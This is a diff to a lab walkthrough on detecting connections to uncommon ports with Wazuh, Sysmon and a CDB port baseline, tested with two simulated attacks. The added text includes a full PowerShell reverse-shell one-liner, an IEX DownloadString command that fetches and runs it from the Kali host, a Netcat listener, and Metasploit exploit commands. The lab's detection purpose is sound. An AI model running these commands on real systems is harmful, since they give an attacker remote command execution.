@@ -10,7 +10,7 @@
 
 This lab demonstrates how to detect **abnormal outbound network connections** from a Windows endpoint using Wazuh.
 
-The detection is built around **Sysmon Event ID 3**, which records network connections. A Wazuh CDB (Constant Database) list is used as a baseline of commonly used ports. A custom Wazuh rule then generates a **Level 10 alert** whenever a network connection is made to a destination port that is not in that baseline.
+The detection is built around **Sysmon Event ID 3**, which records network connections. A Wazuh CDB (Constant Database) list is used as a baseline of commonly used ports. A custom Wazuh rule then generates a **Level 10 alert** whenever a network connection is made to a destination port that is not present in that baseline.
 
 ### Detection Pipeline
 
@@ -24,7 +24,7 @@ Wazuh Agent
       ▼
 Wazuh Manager
       │
-      ├── CDB: common-ports
+      ├── CDB: common-ports baseline
       │
       ├── Destination port NOT found
       │
@@ -33,9 +33,6 @@ Custom Rule 115001
       │
       ▼
 Level 10 Alert
-      │
-      ▼
-Wazuh Dashboard
 ```
 
 ---
@@ -46,10 +43,10 @@ Wazuh Dashboard
 - Install and configure Sysmon.
 - Forward Sysmon events to Wazuh.
 - Create a CDB list of common ports.
-- Write a custom Wazuh detection rule.
-- Simulate suspicious network activity.
+- Write a custom Wazuh detection rule based on network behavior.
+- Validate the detection using two different network activity simulations.
 - Detect uncommon destination ports from the Wazuh Dashboard.
-- Validate the detection with two different attack simulations.
+- Understand how baseline-based detection can support a SOC investigation.
 
 ---
 
@@ -61,7 +58,7 @@ Wazuh Dashboard
 | Windows Server 2019 | Target | `10.4.20.157` |
 | Kali Linux | Attacker | `10.10.50.12` |
 
-> **Note:** These IP addresses belong to this lab session. Do not reuse the example IPs from the original INE instructions in another lab environment.
+> **Note:** These are the IP addresses used during my completed lab session. The original INE instructions may use different example addresses.
 
 ---
 
@@ -80,8 +77,6 @@ The Wazuh server interface showed:
 ```text
 inet 10.4.22.249/20
 ```
-
-
 
 ---
 
@@ -161,11 +156,9 @@ Status   Name
 Running  Sysmon64
 ```
 
-
-
 ---
 
-## Step 2 — Configure Wazuh to collect Sysmon events
+## Step 2 — Configure Wazuh to Collect Sysmon Events
 
 Open:
 
@@ -188,13 +181,13 @@ Restart the Wazuh Agent:
 Restart-Service -Name WazuhSvc
 ```
 
-
-
 ### Important Sysmon Event
 
 **Event ID 3 — Network Connection**
 
-This event provides the network connection telemetry needed by the detection rule.
+Sysmon Event ID 3 provides the network connection telemetry needed by the custom detection rule.
+
+The important fields include information such as the source, destination, destination port, and process responsible for the connection.
 
 ---
 
@@ -241,7 +234,28 @@ Add:
 8443:
 ```
 
-These ports represent the **common/expected ports** for this lab.
+## Understanding the CDB Baseline
+
+The file:
+
+```text
+/var/ossec/etc/lists/common-ports
+```
+
+acts as a **baseline** of expected/common network ports for this lab environment.
+
+A CDB (Constant Database) list allows Wazuh to quickly look up values. By defining what is considered common or expected, Wazuh can identify connections that deviate from the baseline.
+
+For example:
+
+| Port | Baseline Status | Meaning |
+|---:|---|---|
+| `443` | Present | Common/expected |
+| `80` | Present | Common/expected |
+| `1234` | Not present | Uncommon |
+| `4444` | Not present | Uncommon |
+
+> **Important:** An uncommon port is **not automatically malicious**. It is an indicator that may require investigation. Custom applications, development services, testing, or administrator activity can legitimately use uncommon ports.
 
 Set ownership and permissions:
 
@@ -252,7 +266,7 @@ sudo chmod 660 common-ports
 
 ---
 
-## Load the CDB list
+## Load the CDB List
 
 Edit:
 
@@ -292,23 +306,14 @@ Destination Port
        ▼
 common-ports
        │
- ┌─────┴─────┐
- │           │
-Found      Not Found
- │           │
+  ┌────┴─────┐
+  │          │
+Found     Not Found
+  │          │
 No alert   Rule 115001
              │
              ▼
           Level 10
-```
-
-For example:
-
-```text
-443  → common → no uncommon-port alert
-8080 → common → no uncommon-port alert
-4444 → uncommon → alert
-1234 → uncommon → alert
 ```
 
 ---
@@ -333,16 +338,25 @@ Add:
 </group>
 ```
 
-### Rule Breakdown
+## Rule Breakdown
 
-| Configuration | Meaning |
+The rule detects network connections to a destination port that is **not present** in the `common-ports` baseline.
+
+It does **not** specifically look for Metasploit, Netcat, or PowerShell.
+
+The detection logic is essentially:
+
+> **"Is this destination port outside the configured baseline?"**
+
+| Rule Component | Purpose |
 |---|---|
-| `id="115001"` | Custom rule ID |
-| `level="10"` | High-priority alert |
-| `<if_sid>61605</if_sid>` | Builds on the relevant Sysmon network event |
-| `destinationPort` | Field being checked |
-| `not_match_key` | Alert when the port is not found |
-| `common-ports` | Baseline of common ports |
+| `115001` | Custom detection rule ID |
+| `level="10"` | Alert level used for this lab |
+| `if_sid 61605` | Matches the relevant Sysmon network connection event |
+| `win.eventdata.destinationPort` | Destination port observed by Sysmon |
+| `common-ports` | Baseline of expected/common ports |
+| `not_match_key` | Triggers when the port is not found in the baseline |
+| `win.eventdata.image` | Process associated with the network connection |
 
 Validate the configuration:
 
@@ -360,13 +374,24 @@ sudo systemctl restart wazuh-manager
 
 # 🔥 Task 5 — Simulate Abnormal Network Activity
 
-Two detection scenarios were tested.
+Two simulations were used to validate the same behavioral detection logic:
+
+1. Metasploit activity involving destination port `4444`
+2. PowerShell + Netcat activity involving destination port `1234`
+
+The important point is that **both ports are outside the configured baseline**.
 
 ---
 
-## 🧪 Test 1 — Metasploit
+# 🧪 Simulation 1 — Metasploit Activity
 
-On Kali:
+The first simulation used Metasploit to generate network activity involving an uncommon destination port:
+
+```text
+4444
+```
+
+On Kali (`10.10.50.12`):
 
 ```bash
 msfconsole -q
@@ -382,16 +407,22 @@ set SMBPass <LAB_PASSWORD>
 exploit
 ```
 
-> **Security note:** The lab password is intentionally omitted from this public GitHub documentation.
+> **Technical note:** Although the lab context references pass-the-hash activity, the commands shown here authenticate using a username and password rather than an NTLM hash. This walkthrough therefore focuses on the resulting network activity and Wazuh detection rather than claiming that these exact commands demonstrate a pure pass-the-hash attack.
 
-Metasploit successfully opened a Meterpreter session:
+The successful session showed:
 
 ```text
 Meterpreter session 1 opened
 (10.10.50.12:4444 -> 10.4.20.157:50097)
 ```
 
-The important observation is the reverse connection using destination port:
+## Expected Result
+
+Wazuh should generate Rule `115001` when the destination port is not present in the `common-ports` CDB list.
+
+## Observation
+
+The important observation is the connection involving destination port:
 
 ```text
 4444
@@ -399,11 +430,37 @@ The important observation is the reverse connection using destination port:
 
 Port `4444` is **not present** in `common-ports`.
 
+Therefore, Rule `115001` triggers.
+
+## Detection Flow
+
+```text
+Metasploit activity
+       ↓
+Windows process creates network activity
+       ↓
+Sysmon Event ID 3 records network connection
+       ↓
+Wazuh Agent forwards event
+       ↓
+Wazuh Manager processes event
+       ↓
+Destination port = 4444
+       ↓
+Check common-ports CDB
+       ↓
+4444 NOT FOUND
+       ↓
+Rule 115001 triggers
+       ↓
+Level 10 Alert
+```
+
 ---
 
-## 🚨 Wazuh Detection — Port 4444
+# 🚨 Wazuh Detection — Port 4444
 
-The Wazuh Dashboard generated:
+The Wazuh Dashboard generated an alert similar to:
 
 ```text
 [Network connection]: Network connection to an Uncommon Port 4444
@@ -419,31 +476,31 @@ Port:    4444
 Process: powershell.exe
 ```
 
-![Wazuh Dashboard — Port 4444 Alert](wazuh_verify.png)
+### Evidence
 
-### Detection Result
+![Wazuh Dashboard showing Rule 115001 detecting destination port 4444.](images/wazuh_verify.png)
 
-```text
-Metasploit
-    ↓
-Windows network connection
-    ↓
-Destination port 4444
-    ↓
-4444 not in common-ports
-    ↓
-Rule 115001
-    ↓
-🚨 Level 10 Alert
-```
+*Figure: Wazuh Dashboard showing Rule 115001 detecting a network connection to uncommon destination port 4444.*
+
+> **Important:** Wazuh detected the resulting network connection to destination port `4444`. The detection is **not** "Metasploit detected." The detection is based on the network behavior.
 
 ---
 
-# 🧪 Test 2 — PowerShell + Netcat
+# 🧪 Simulation 2 — PowerShell + Netcat
 
-The second simulation used a PowerShell script hosted from Kali and a Netcat listener on an uncommon port.
+The second simulation used:
 
-## Step 1 — Create the script
+- PowerShell on Windows
+- A PowerShell TCP script
+- Python HTTP server on Kali
+- Netcat listener on Kali
+- Destination port `1234`
+
+This simulation is useful because it demonstrates that the same Wazuh rule can detect uncommon network behavior generated by a completely different method.
+
+---
+
+## Step 1 — Create the PowerShell Script
 
 On Kali:
 
@@ -451,34 +508,72 @@ On Kali:
 nano mypowershell.ps1
 ```
 
-The script was configured to connect to:
+Save the following script:
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("10.10.50.12",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+### What the Script Does
+
+The important part for this Wazuh lab is:
 
 ```text
 10.10.50.12:1234
 ```
 
+The script creates a TCP client on the Windows machine and attempts to connect to the Kali machine on TCP port `1234`.
+
+Conceptually:
+
+```text
+Windows PowerShell
+       │
+       │ TCP connection
+       │
+       │ Destination: 10.10.50.12
+       │ Destination Port: 1234
+       ▼
+Kali Netcat Listener
+```
+
+The script then communicates over that TCP connection.
+
+For this detection lab, the important fact is that the script creates network traffic that Sysmon can observe.
+
 ---
 
-## Step 2 — Host the script
+## Step 2 — Host the Script
 
-Start a Python HTTP server:
+Start a simple HTTP server on Kali:
 
 ```bash
 python3 -m http.server 80
 ```
 
-The Windows target successfully downloaded the script:
+This hosts:
 
 ```text
-10.4.20.157 - - [07/Oct/2026 11:12:00]
-"GET /mypowershell.ps1 HTTP/1.1" 200 -
+mypowershell.ps1
 ```
 
-This confirmed that the script delivery worked.
+The Windows machine will download it from:
+
+```text
+http://10.10.50.12:80/mypowershell.ps1
+```
+
+### Important
+
+Port `80` is **not** the abnormal port being detected.
+
+Port `80` is already included in the `common-ports` baseline.
+
+The HTTP server is only being used to transfer the PowerShell script.
 
 ---
 
-## Step 3 — Start the Netcat listener
+## Step 3 — Start the Netcat Listener
 
 On another Kali terminal:
 
@@ -486,210 +581,487 @@ On another Kali terminal:
 nc -lvnp 1234
 ```
 
-The listener received:
+Options:
+
+- `nc` = Netcat
+- `-l` = listen mode
+- `-v` = verbose output
+- `-n` = do not perform DNS resolution
+- `-p 1234` = listen on TCP port `1234`
+
+At this point, Kali is waiting for the Windows machine to connect.
+
+---
+
+## Step 4 — Download and Execute the Script on Windows
+
+On the Windows Server:
+
+```powershell
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.50.12:80/mypowershell.ps1')"
+```
+
+What happens:
+
+```text
+PowerShell
+    ↓
+Downloads mypowershell.ps1
+    ↓
+HTTP connection to Kali:80
+    ↓
+IEX executes the downloaded script
+    ↓
+Script creates TCP connection
+    ↓
+Connection to Kali:1234
+```
+
+---
+
+# 🔎 Understanding the Two Network Connections
+
+This is an important part of the simulation.
+
+There are **two separate network connections**.
+
+## Connection 1 — HTTP Script Download
+
+```text
+Windows Server
+10.4.20.157
+       │
+       │ HTTP / TCP 80
+       ▼
+Kali Linux
+10.10.50.12
+       │
+       ▼
+Python HTTP Server
+```
+
+Purpose:
+
+```text
+Download mypowershell.ps1
+```
+
+Destination port:
+
+```text
+80
+```
+
+Port `80` is in the CDB baseline.
+
+Therefore, this is **not** the uncommon-port connection that triggers Rule `115001`.
+
+---
+
+## Connection 2 — PowerShell TCP Connection
+
+```text
+Windows Server
+10.4.20.157
+       │
+       │ TCP
+       │ Destination Port 1234
+       ▼
+Kali Linux
+10.10.50.12
+       │
+       ▼
+Netcat Listener
+TCP/1234
+```
+
+Purpose:
+
+```text
+Create the TCP communication used by the PowerShell script
+```
+
+Destination port:
+
+```text
+1234
+```
+
+Port `1234` is **not** in the CDB baseline.
+
+Therefore, this is the connection that triggers Rule `115001`.
+
+---
+
+## Step 5 — Observe the Netcat Connection
+
+The Netcat listener showed:
 
 ```text
 Connection from 10.4.20.157.
 Connection from 10.4.20.157:50106.
 ```
 
-This confirmed a Windows connection to Kali on port `1234`.
+### Destination vs Source Port
+
+This is important to understand.
+
+| Value | Meaning |
+|---|---|
+| `10.4.20.157` | Windows Server IP |
+| `10.10.50.12` | Kali IP |
+| `1234` | Kali listening/destination port |
+| `50106` | Temporary/ephemeral source port used by Windows |
+
+The Wazuh rule checks:
+
+```text
+win.eventdata.destinationPort
+```
+
+Therefore, the important value is:
+
+```text
+1234
+```
+
+Not:
+
+```text
+50106
+```
+
+---
+
+## Step 6 — Wazuh Detection
+
+After the PowerShell script connects to Netcat:
+
+```text
+PowerShell Script
+       ↓
+TCP connection to Kali:1234
+       ↓
+Sysmon Event ID 3
+       ↓
+Wazuh Agent
+       ↓
+Wazuh Manager
+       ↓
+destinationPort = 1234
+       ↓
+common-ports lookup
+       ↓
+1234 NOT FOUND
+       ↓
+Rule 115001
+       ↓
+Level 10 Alert
+```
+
+### Why Did the Alert Trigger?
+
+The custom rule checks whether the destination port is present in the CDB baseline.
+
+The event contained:
+
+```text
+destinationPort = 1234
+```
+
+The CDB did not contain `1234`.
+
+Therefore:
+
+```text
+1234
+ ↓
+Not in common-ports
+ ↓
+Rule 115001
+ ↓
+Level 10 Alert
+```
 
 ---
 
 # 🚨 Wazuh Detection — Port 1234
 
-The Wazuh Dashboard generated another **Rule 115001 / Level 10** alert:
+The Wazuh Dashboard displayed:
 
 ```text
-[Network connection]: Network connection to an Uncommon Port 1234
-by C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Rule ID: 115001
+Level: 10
+Destination Port: 1234
 ```
 
-![Wazuh Dashboard — Port 1234 and 4444 Alerts](wazuh_verify2.png)
+### Evidence
 
-### Additional Dashboard Evidence
+![Wazuh Dashboard showing Rule 115001 detecting destination port 1234 and 4444.](images/wazuh_verify2.png)
 
-![Wazuh Dashboard — Port 4444 Alert](wazuh_verify.png)
+*Figure: Wazuh Dashboard showing the completed detection results for uncommon destination ports 1234 and 4444.*
 
-### Detection Result
+> **Important:** Wazuh is not specifically detecting "Netcat" or "PowerShell". It is detecting the resulting network connection to destination port `1234`.
+
+---
+
+# 📊 Simulation Comparison
+
+| Simulation | Method | Destination Port | In Baseline? | Result |
+|---|---|---:|---|---|
+| 1 | Metasploit | `4444` | ❌ No | Rule 115001 / Level 10 |
+| 2 | PowerShell + Netcat | `1234` | ❌ No | Rule 115001 / Level 10 |
+
+Both simulations triggered the same rule because the detection condition is:
 
 ```text
-PowerShell
+Destination port is NOT present in common-ports
+```
+
+The tools are different, but the detection logic is the same.
+
+---
+
+# 📸 Evidence — Completed Wazuh Detection
+
+The following screenshot shows both uncommon-port alerts in the Wazuh Dashboard:
+
+- Port `1234`
+- Port `4444`
+- Rule `115001`
+- Level `10`
+
+![Wazuh Dashboard showing both Rule 115001 detections for ports 1234 and 4444.](images/wazuh_verify2.png)
+
+*Figure: Wazuh Dashboard showing both successful uncommon-port detections.*
+
+The second screenshot provides a focused view of the `4444` detection:
+
+![Wazuh Dashboard showing the Rule 115001 port 4444 alert.](images/wazuh_verify.png)
+
+*Figure: Wazuh Dashboard showing the Rule 115001 alert for destination port 4444.*
+
+---
+
+# 🧠 What These Simulations Prove
+
+These two simulations demonstrate that the custom Wazuh rule can detect different network connections when their destination ports are outside the configured common-port baseline.
+
+### Simulation 1
+
+```text
+Port 4444
     ↓
-Windows network connection
-    ↓
-Destination port 1234
-    ↓
-1234 not in common-ports
+Not in baseline
     ↓
 Rule 115001
     ↓
-🚨 Level 10 Alert
+Level 10 Alert
+```
+
+### Simulation 2
+
+```text
+Port 1234
+    ↓
+Not in baseline
+    ↓
+Rule 115001
+    ↓
+Level 10 Alert
+```
+
+The important takeaway is:
+
+> **The detection logic is based on network behavior, not on a specific attack tool.**
+
+---
+
+# 🛡️ Why This Matters in a SOC
+
+A SOC analyst should not rely only on signatures for known attack tools.
+
+Attackers can use different tools, scripts, or custom malware.
+
+Behavior-based detection can identify suspicious deviations from normal activity.
+
+In this lab:
+
+```text
+Normal/common ports
+       ↓
+Baseline
+       ↓
+Unexpected destination port
+       ↓
+Potential anomaly
+       ↓
+Alert
+       ↓
+SOC investigation
+```
+
+An uncommon port is an **indicator that requires investigation**, not automatic proof of compromise.
+
+### Possible Legitimate Reasons
+
+- Custom applications
+- Development servers
+- Internal services
+- Temporary testing
+- Administrator activity
+
+### Possible Suspicious Reasons
+
+- Reverse shells
+- Command-and-control communication
+- Malware callbacks
+- Unauthorized services
+- Suspicious data transfer
+
+A SOC analyst should investigate the process, destination IP, user, timing, frequency, and surrounding events before deciding whether the activity is malicious.
+
+---
+
+# 🔍 In Simple Terms
+
+Think of the CDB list as a **guest list**.
+
+```text
+443  → On the list → Expected
+80   → On the list → Expected
+1234 → Not on list → Alert
+4444 → Not on list → Alert
+```
+
+So:
+
+```text
+Destination Port
+       ↓
+Is it in common-ports?
+       ↓
+   ┌───┴────┐
+  YES       NO
+   │         │
+Expected   Rule 115001
+             │
+             ▼
+          Level 10
+```
+
+The important concept is:
+
+> **Wazuh is detecting an uncommon destination port, not a specific hacking tool.**
+
+---
+
+# 🧩 Complete Lab Architecture
+
+```text
+                     ┌──────────────────────┐
+                     │      Kali Linux      │
+                     │     10.10.50.12      │
+                     │                      │
+                     │ HTTP Server :80      │
+                     │ Netcat      :1234    │
+                     └──────────┬───────────┘
+                                ▲
+                         Network Connections
+                                │
+                                │
+                     ┌──────────┴───────────┐
+                     │   Windows Server     │
+                     │     10.4.20.157      │
+                     │                      │
+                     │ PowerShell           │
+                     │ Sysmon               │
+                     │ Event ID 3           │
+                     └──────────┬───────────┘
+                                │
+                                │ Sysmon Events
+                                ▼
+                     ┌──────────────────────┐
+                     │    Wazuh Agent       │
+                     └──────────┬───────────┘
+                                │
+                                ▼
+                     ┌──────────────────────┐
+                     │   Wazuh Manager      │
+                     │     10.4.22.249      │
+                     │                      │
+                     │ common-ports CDB     │
+                     │ Rule 115001          │
+                     └──────────┬───────────┘
+                                │
+                                ▼
+                         🚨 Level 10 Alert
 ```
 
 ---
 
+# 📝 Key Learning Points
 
-## 📸 Evidence Gallery
+### 1. Sysmon
 
-Use the following screenshots as visual evidence for the lab results.
+Sysmon provides detailed Windows telemetry, including network connection events.
 
-### Wazuh Dashboard — Port 1234 Detection
+### 2. Wazuh Agent
 
-![Wazuh Dashboard Port 1234](wazuh_verify2.png)
+The Wazuh Agent collects and forwards the relevant Sysmon events.
 
-### Wazuh Dashboard — Port 4444 Detection
+### 3. Wazuh Manager
 
-![Wazuh Dashboard Port 4444](wazuh_verify.png)
+The Wazuh Manager analyzes the incoming events and applies detection rules.
 
+### 4. CDB Baseline
 
-# 📊 Final Results
+The `common-ports` CDB provides a list of ports considered common or expected for this lab.
 
-| Simulation | Port | Rule | Level | Result |
-|---|---:|---:|---:|---|
-| Metasploit | `4444` | `115001` | `10` | ✅ Detected |
-| PowerShell + Netcat | `1234` | `115001` | `10` | ✅ Detected |
+### 5. Custom Rule
 
----
+Rule `115001` detects destination ports that are not present in the baseline.
 
-# 🔍 SOC Analyst Perspective
+### 6. Behavioral Detection
 
-This lab demonstrates a simple but useful form of **behavior-based detection**.
+The rule focuses on **network behavior** rather than depending on a specific attack tool.
 
-Instead of creating a rule specifically for Metasploit, the detection looks for an abnormal characteristic:
+### 7. Alert Validation
+
+The detection was successfully validated using destination ports:
 
 ```text
-Network connection
-       +
-Destination port not in baseline
-       =
-Suspicious network activity
+4444
+1234
 ```
 
-This makes the rule independent of the exact tool used.
-
-For example, both of these were detected:
+Both generated:
 
 ```text
-Metasploit → 4444
-PowerShell → 1234
-```
-
-because both ports were outside the configured baseline.
-
----
-
-# 🧠 Key Takeaways
-
-### 1. Sysmon provides endpoint visibility
-
-Sysmon Event ID 3 gives the SOC useful information about network connections made by Windows processes.
-
-### 2. Wazuh centralizes the telemetry
-
-The Wazuh Agent forwards Windows/Sysmon events to the Wazuh Manager for analysis.
-
-### 3. CDB lists can establish a baseline
-
-The `common-ports` list defines ports considered normal for this lab.
-
-### 4. Custom rules enable detection engineering
-
-Rule `115001` was created specifically to identify connections to ports outside the baseline.
-
-### 5. Detection should be validated
-
-The rule was not just configured; it was tested using two different simulations:
-
-```text
-4444 → Detected ✅
-1234 → Detected ✅
-```
-
-### 6. Context matters
-
-A connection to an uncommon port is **not automatically malicious** in a real environment. Analysts should investigate the destination, process, user, host role, timing, and surrounding events before declaring an incident.
-
----
-
-# 🗺️ Detection Map
-
-```text
-                    ┌───────────────────┐
-                    │   Kali Attacker   │
-                    │   10.10.50.12     │
-                    └─────────┬─────────┘
-                              │
-                    ┌─────────┴─────────┐
-                    │                   │
-                 :4444                :1234
-                Metasploit          PowerShell
-                    │                   │
-                    └─────────┬─────────┘
-                              ▼
-                    ┌───────────────────┐
-                    │ Windows Target    │
-                    │ 10.4.20.157       │
-                    └─────────┬─────────┘
-                              │
-                      Sysmon Event ID 3
-                              │
-                              ▼
-                    ┌───────────────────┐
-                    │   Wazuh Agent     │
-                    └─────────┬─────────┘
-                              │
-                              ▼
-                    ┌───────────────────┐
-                    │  Wazuh Manager    │
-                    │ 10.4.22.249       │
-                    └─────────┬─────────┘
-                              │
-                     CDB common-ports
-                              │
-                    Port not in baseline
-                              │
-                              ▼
-                    ┌───────────────────┐
-                    │ Rule 115001       │
-                    │ Level 10          │
-                    └─────────┬─────────┘
-                              │
-                              ▼
-                    🚨 Security Alert
+Rule ID: 115001
+Level: 10
 ```
 
 ---
 
 # 🏁 Conclusion
 
-In this lab, I configured Wazuh and Sysmon to detect abnormal network connections from a Windows endpoint.
+This lab demonstrated how endpoint network telemetry from Sysmon can be integrated with Wazuh and compared against a CDB-based baseline.
 
-The implementation covered:
+Two different simulations were used:
 
-```text
-Wazuh Agent
-     ↓
-Sysmon
-     ↓
-Event ID 3
-     ↓
-CDB Baseline
-     ↓
-Custom Detection Rule
-     ↓
-Security Alert
-```
+- Metasploit activity involving destination port `4444`
+- PowerShell + Netcat activity involving destination port `1234`
 
-The custom Wazuh rule successfully detected two uncommon destination ports:
+Both ports were outside the configured `common-ports` baseline, so Wazuh generated **Rule 115001 / Level 10** alerts.
 
-```text
-4444 → Metasploit → Level 10 ✅
-1234 → PowerShell/Netcat → Level 10 ✅
-```
+The most important lesson from this lab is that the custom rule is not tied to a specific tool. It detects **network behavior that deviates from the configured baseline**.
 
-### Skills Demonstrated
+This is a useful SOC detection concept because it can provide an investigation signal even when the exact attack tool or technique is unknown.
+
+---
+
+## 🛠️ Skills Demonstrated
 
 - 🛡️ Wazuh SIEM
 - 🪟 Windows Security Monitoring
@@ -697,9 +1069,11 @@ The custom Wazuh rule successfully detected two uncommon destination ports:
 - 📋 Log Collection
 - ⚙️ Wazuh Custom Rules
 - 🗃️ CDB Lists
+- 🌐 Network Monitoring
 - 🚨 Alert Validation
 - 🔬 Detection Engineering
-- 👨‍💻 SOC Analyst Workflow
+- 👨💻 SOC Analyst Workflow
+- 📊 Baseline-Based Detection
 
 ---
 
@@ -713,19 +1087,12 @@ The custom Wazuh rule successfully detected two uncommon destination ports:
 
 ## 📁 Repository Structure
 
-Recommended structure inside `INE_labs`:
-
 ```text
 Detecting_Abnormal_Network_Connections_With_Wazuh/
 ├── Detecting_Abnormal_Network_Connections_With_Wazuh_Walkthrough.md
 └── images/
-    ├── 01-soc-machine-ip.png
-    ├── 02-windows-wazuh-agent-sysmon.png
-    ├── 03-sysmon-wazuh-integration.png
-    ├── 04-wazuh-alert-port-4444.png
-    ├── 05-wazuh-alerts-port-1234-and-4444.png
-    ├── 06-wazuh-dashboard-port-1234.png
-    └── 07-wazuh-dashboard-port-4444.png
+    ├── wazuh_verify.png
+    └── wazuh_verify2.png
 ```
 
-> This version is prepared for a **public GitHub repository**: the lab password is intentionally replaced with `<LAB_PASSWORD>` so credentials are not committed to Git.
+> **Public GitHub note:** The lab password is intentionally replaced with `<LAB_PASSWORD>` so credentials are not committed to Git.
